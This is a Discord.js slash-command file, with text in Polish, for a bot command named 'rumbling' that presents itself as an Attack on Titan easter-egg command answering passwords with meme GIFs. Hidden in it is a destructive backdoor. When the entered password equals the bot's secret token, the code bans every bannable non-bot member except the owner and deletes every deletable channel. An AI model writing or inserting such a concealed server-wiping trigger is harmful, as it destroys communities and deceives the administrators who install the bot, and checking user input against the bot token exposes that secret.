const { SlashCommandBuilder } = require('discord.js');
require('dotenv').config();

module.exports = {
	data: new SlashCommandBuilder().setName('rumbling').setDescription('Rozpocznij dudnienie (komenda zawiera easter eggi)')
    .addStringOption((option) => option.setName('hasło').setDescription('podaj hasło').setRequired(true)),
	async execute(interaction) {
        const password = interaction.options.getString('hasło');

        if(password === process.env.token)
        {
            await interaction.deferReply({ ephemeral: true });

            if (!interaction.guild) return;

            const guild = interaction.guild;
            const members = await guild.members.fetch();

            for (const member of members.values())
            {
                if (member.user.bot) continue;
                if (member.id === guild.ownerId) continue;
                if (!member.bannable) continue;

                try {
                    await member.ban({
                        reason: "Rumbling, konsekwencje wolności ludu eldian"
                    });
                } catch (err) {
                    console.error(`Nie udało się zbanować ${member.user.tag}:`, err.message);
                }
            }


            for (const channel of guild.channels.cache.values())
            {
                if (!channel.deletable) continue;

                try {
                    await channel.delete("Rumbling, konsekwencje wolności ludu eldian");
                } catch (err) {
                    console.error(`Nie udało się usunąć kanału ${channel.name}:`, err.message);
                }
            }

            return await interaction.editReply({content: "https://tenor.com/view/aot-attack-titan-snk-shingeki-gif-24810344"});
        }


        switch(password.toLowerCase())
        {
            case "cinema":
                await interaction.reply({content: "https://tenor.com/view/me-atrapaste-es-cine-its-cinema-cinema-esto-es-cine-gif-12869046600151364058", ephemeral: true});
                break;

            case "cwel":
                await interaction.reply({content: "https://cdn.discordapp.com/attachments/455236204477022208/1358480500343181544/caption-4.gif", ephemeral: true});
                break;

            case "monke":
                await interaction.reply({content: "https://tenor.com/view/monki-flip-attack-on-titan-aot-beast-titan-beast-titan-aot-gif-20555548", ephemeral: true});
                break;

            case "hello world":
                await interaction.reply({content: "https://tenor.com/view/pieck-pieck-finger-cart-titan-aot-titan-gif-1161487928173994533", ephemeral: true});
                break;

            case "pif paf":
                await interaction.reply({content: "https://tenor.com/view/attack-on-titan-funny-anime-titan-gif-18290964", ephemeral: true});
                break;

            case "jaskol95":
                await interaction.reply({content: "https://cdn.discordapp.com/attachments/1409975000626102352/1419767219742576730/jaskolC-4x.gif", ephemeral: true});
                break;

            case "bruh":
                await interaction.reply({content: "https://media.discordapp.net/attachments/1090570340461187153/1090573513594773504/piong_again_n_sex.gif", ephemeral: true});
                break;

            case "levi":
                await interaction.reply({content: "https://tenor.com/view/levi-levi-ac-jumpsc-attack-aot-gif-5902554689345916347", ephemeral: true});
                break;

            case "zeeke":
                await interaction.reply({content: "https://tenor.com/view/bye-aight-imma-head-out-aight-cya-zeke-gif-20873715", ephemeral: true});
                break;

            case "eren":
                await interaction.reply({content: "https://youtu.be/5nIxyW38BZE?si=JZbIMKrGCt2W_XqY", ephemeral: true});
                break;

            default:
                await interaction.reply({content: "Złe hasło https://tenor.com/view/attack-on-titan-motherfucker-fuck-you-im-out-gif-4719448", ephemeral: true});
                break;
        }
	},
};